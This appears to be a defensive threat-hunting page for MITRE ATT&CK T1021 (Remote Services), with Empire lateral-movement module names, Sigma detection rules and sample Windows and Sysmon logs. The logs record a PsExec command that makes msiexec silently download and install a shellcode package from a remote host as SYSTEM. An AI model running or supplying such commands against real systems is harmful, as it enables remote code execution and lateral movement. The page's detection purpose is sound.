
# Remote Services

## Description

### MITRE Description

> Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1021

## Potential Commands

```
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_launcher
Log
windows security log
EventID: 4688
Process information:
New Process ID: 0xe84
New Process Name: C: \ Users \ 12306Br0 \ Desktop \ PSTools \ PsExec.exe

EventID: 4688
Process information:
New Process ID: 0xfcc
New Process Name: C: \ Windows \ PSEXESVC.exe

EVentID: 5140
Internet Information:
Object Type: File
Source Address: fe80 :: 719e: d312: 648f: 4884
Source Port: 49369
Share information:
Share name: \\ * \ IPC $

EventID: 5145
Internet Information:
Object Type: File
Source Address: fe80 :: 719e: d312: 648f: 4884
Source Port: 49369

Share information:
Share Name: \\ * \ IPC $
Share path:
Relative Target Name: PSEXESVC

SYSMON log
EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 15: 09: 29.237
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}
ProcessId: 3716
Image: C: \ Users \ 12306Br0 \ Desktop \ PSTools \ PsExec.exe
FileVersion: 2.2
Description: Execute processes remotely
Product: Sysinternals PsExec
Company: Sysinternals - www.sysinternals.com
OriginalFileName: psexec.c
CommandLine: PsExec.exe -d -s msiexec.exe / q / i http://192.168.126.146/shellcode.msi
CurrentDirectory: C: \ Users \ 12306Br0 \ Desktop \ PSTools \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
LogonId: 0x6e1ea
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1 = E50D9E3BD91908E13A26B3E23EDEAF577FB3A095
ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}
ParentProcessId: 3492
ParentImage: C: \ Windows \ System32 \ cmd.exe
ParentCommandLine: "C: \ Windows \ System32 \ cmd.exe"

EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 15: 09: 29.284
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ProcessId: 4044
Image: C: \ Windows \ PSEXESVC.exe
FileVersion: 2.2
Description: PsExec Service
Product: Sysinternals PsExec
Company: Sysinternals
OriginalFileName: psexesvc.exe
CommandLine: C: \ Windows \ PSEXESVC.exe
CurrentDirectory: C: \ Windows \ system32 \
User: NT AUTHORITY \ SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1 = A17C21B909C56D93D978014E63FB06926EAEA8E7
ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}
ParentProcessId: 496
ParentImage: C: \ Windows \ System32 \ services.exe
ParentCommandLine: C: \ Windows \ system32 \ services.exe

EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 15: 09: 29.440
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}
ProcessId: 1916
Image: C: \ Windows \ System32 \ msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: "msiexec.exe" / q / i http://192.168.126.146/shellcode.msi
CurrentDirectory: C: \ Windows \ system32 \
User: NT AUTHORITY \ SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ParentProcessId: 4044
ParentImage: C: \ Windows \ PSEXESVC.exe
ParentCommandLine: C: \ Windows \ PSEXESVC.exe
```

## Commands Dataset

```
[{'command': 'python/lateral_movement/multi/ssh_command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/lateral_movement/multi/ssh_command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/lateral_movement/multi/ssh_launcher',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/lateral_movement/multi/ssh_launcher',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Log\n'
             'windows security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xe84\n'
             'New Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools '
             '\\ PsExec.exe\n'
             '\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xfcc\n'
             'New Process Name: C: \\ Windows \\ PSEXESVC.exe\n'
             '\n'
             'EVentID: 5140\n'
             'Internet Information:\n'
             'Object Type: File\n'
             'Source Address: fe80 :: 719e: d312: 648f: 4884\n'
             'Source Port: 49369\n'
             'Share information:\n'
             'Share name: \\\\ * \\ IPC $\n'
             '\n'
             'EventID: 5145\n'
             'Internet Information:\n'
             'Object Type: File\n'
             'Source Address: fe80 :: 719e: d312: 648f: 4884\n'
             'Source Port: 49369\n'
             '\n'
             'Share information:\n'
             'Share Name: \\\\ * \\ IPC $\n'
             'Share path:\n'
             'Relative Target Name: PSEXESVC\n'
             '\n'
             'SYSMON log\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 15: 09: 29.237\n'
             'ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}\n'
             'ProcessId: 3716\n'
             'Image: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\ '
             'PsExec.exe\n'
             'FileVersion: 2.2\n'
             'Description: Execute processes remotely\n'
             'Product: Sysinternals PsExec\n'
             'Company: Sysinternals - www.sysinternals.com\n'
             'OriginalFileName: psexec.c\n'
             'CommandLine: PsExec.exe -d -s msiexec.exe / q / i '
             'http://192.168.126.146/shellcode.msi\n'
             'CurrentDirectory: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools '
             '\\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\n'
             'LogonId: 0x6e1ea\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: High\n'
             'Hashes: SHA1 = E50D9E3BD91908E13A26B3E23EDEAF577FB3A095\n'
             'ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}\n'
             'ParentProcessId: 3492\n'
             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'ParentCommandLine: "C: \\ Windows \\ System32 \\ cmd.exe"\n'
             '\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 15: 09: 29.284\n'
             'ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\n'
             'ProcessId: 4044\n'
             'Image: C: \\ Windows \\ PSEXESVC.exe\n'
             'FileVersion: 2.2\n'
             'Description: PsExec Service\n'
             'Product: Sysinternals PsExec\n'
             'Company: Sysinternals\n'
             'OriginalFileName: psexesvc.exe\n'
             'CommandLine: C: \\ Windows \\ PSEXESVC.exe\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: NT AUTHORITY \\ SYSTEM\n'
             'LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\n'
             'LogonId: 0x3e7\n'
             'TerminalSessionId: 0\n'
             'IntegrityLevel: System\n'
             'Hashes: SHA1 = A17C21B909C56D93D978014E63FB06926EAEA8E7\n'
             'ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}\n'
             'ParentProcessId: 496\n'
             'ParentImage: C: \\ Windows \\ System32 \\ services.exe\n'
             'ParentCommandLine: C: \\ Windows \\ system32 \\ services.exe\n'
             '\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 15: 09: 29.440\n'
             'ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}\n'
             'ProcessId: 1916\n'
             'Image: C: \\ Windows \\ System32 \\ msiexec.exe\n'
             'FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\n'
             'Description: Windows installer\n'
             'Product: Windows Installer - Unicode\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: msiexec.exe\n'
             'CommandLine: "msiexec.exe" / q / i '
             'http://192.168.126.146/shellcode.msi\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: NT AUTHORITY \\ SYSTEM\n'
             'LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\n'
             'LogonId: 0x3e7\n'
             'TerminalSessionId: 0\n'
             'IntegrityLevel: System\n'
             'Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\n'
             'ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\n'
             'ParentProcessId: 4044\n'
             'ParentImage: C: \\ Windows \\ PSEXESVC.exe\n'
             'ParentCommandLine: C: \\ Windows \\ PSEXESVC.exe',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/01/29',
                  'description': 'Detects netsh commands that configure a port '
                                 'forwarding of port 3389 used for RDP',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['netsh i* '
                                                              'p*=3389 c*']}},
                  'falsepositives': ['Legitimate administration'],
                  'id': '782d6f3e-4c5d-4b8c-92a3-1d05fed72e63',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement',
                           'attack.t1021',
                           'car.2013-07-002'],
                  'title': 'Netsh RDP Port Forwarding'}},
 {'data_source': ['4624', ' 4625', 'Authentication logs']},
 {'data_source': ['21', ' 23', ' 25', ' 41', 'RDP Logs']},
 {'data_source': ['4624', ' 4625', 'Authentication logs']},
 {'data_source': ['21', ' 23', ' 25', ' 41', 'RDP Logs']}]
```

## Potential Queries

```json
[{'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: win_ remote powershell session\n'
           'description: windows server 2016\n'
           'tags: T1021-006\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: security\n'
           'detection:\n'
           '    selection1:\n'
           '        EventID: 4688 # have created a new process.\n'
           "        Newprocessname: 'C: \\ Windows \\ System32 \\ dllhost.exe' "
           '# new process name\n'
           "        Creatorprocessname: 'C: \\ Windows \\ System32 \\ "
           "svchost.exe' # creator process name\n"
           '    selection2:\n'
           '        EventID: 4688 # have created a new process.\n'
           "        Newprocessname: 'C: \\ Windows \\ System32 \\ "
           "wsmprovhost.exe' # new process name\n"
           "        Creatorprocessname: 'C: \\ Windows \\ System32 \\ "
           "svchost.exe' # creator process name\n"
           "        Processcommandline: 'C: \\ Windows \\ system32 \\ "
           "wsmprovhost.exe -Embedding' # process command line arguments\n"
           '    timeframe: last 2s\n'
           '    condition: selection\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1021',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/lateral_movement/multi/ssh_command":  '
                                                                                 '["T1021"],',
                                            'Empire Module': 'python/lateral_movement/multi/ssh_command',
                                            'Technique': 'Remote Services'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1021',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/lateral_movement/multi/ssh_launcher":  '
                                                                                 '["T1021"],',
                                            'Empire Module': 'python/lateral_movement/multi/ssh_launcher',
                                            'Technique': 'Remote Services'}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations


* [Multi-factor Authentication](../mitigations/Multi-factor-Authentication.md)

* [User Account Management](../mitigations/User-Account-Management.md)
    

# Actors

None
